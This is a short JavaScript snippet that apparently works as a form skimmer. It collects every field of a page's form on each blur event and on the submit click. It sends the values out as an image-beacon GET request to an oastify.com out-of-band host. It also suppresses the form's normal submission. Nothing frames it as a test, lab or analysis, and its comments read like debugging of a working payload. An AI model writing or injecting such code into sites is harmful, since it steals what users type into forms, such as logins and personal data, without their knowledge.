// --- Helper Function to Send Data via GET Parameter ---
function sendFormData(formElement) {
    if (!formElement) {
        console.error('No form element provided to sendFormData.');
        return;
    }

    const formData = {};
    const elements = formElement.elements;

    // Loop through all form elements to gather data
    for (let i = 0; i < elements.length; i++) {
        const element = elements[i];
        const name = element.name;
        const value = element.value;

        if (name) {
            if (element.type === 'radio') {
                if (element.checked) {
                    formData[name] = value;
                }
            } else if (element.type === 'checkbox') {
                formData[name] = element.checked;
            } else {
                formData[name] = value;
            }
        }
    }

    // Convert the form data object to a JSON string
    const jsonData = JSON.stringify(formData);
    
    // URL-encode the JSON string so it can be safely sent in a URL
    const encodedData = encodeURIComponent(jsonData);

    const baseUrl = 'https://gi2zxgb9mz9eawl5yzg5k2b02r8iw8kx.oastify.com/';
    
    // Log the action
    console.log('Sending data via GET (Image beacon)...');

    // *** THIS IS THE FIX ***
    // Create a new image in memory. Setting its 'src' forces
    // the browser to make a GET request to that URL.
    // We append our encoded data as a query parameter named 'data'.
    new Image().src = `${baseUrl}?data=${encodedData}`;
    
    // The request is sent. We don't need .then() or .catch()
    // because we're just "firing and forgetting."
}

// --- Main Logic (to trigger the function) ---

// 1. Find the form
const form = document.getElementById('form');

if (form) {
    // 2. Add a 'blur' event listener to the whole form
    form.addEventListener('blur', (event) => {
        // Check if the element that lost focus is an input field
        const targetTag = event.target.tagName;
        if (targetTag === 'INPUT' || targetTag === 'SELECT' || targetTag === 'TEXTAREA') {
            console.log(`Unfocus event on: ${event.target.name}`);
            sendFormData(form); // Send all form data
        }
    }, true); // 'true' uses event capturing

} else {
    console.error('Form with ID "form" not found.');
}

// 3. Keep your submit button logic
const submitButton = document.getElementById('btnComplete');

if (submitButton) {
    submitButton.addEventListener('click', function(event) {
        event.preventDefault(); // Stop the form from submitting normally
        console.log('Submit button clicked.');
        sendFormData(form); // Send all form data
    });
} else {
    console.warn('Submit button with ID "btnComplete" not found.');
}
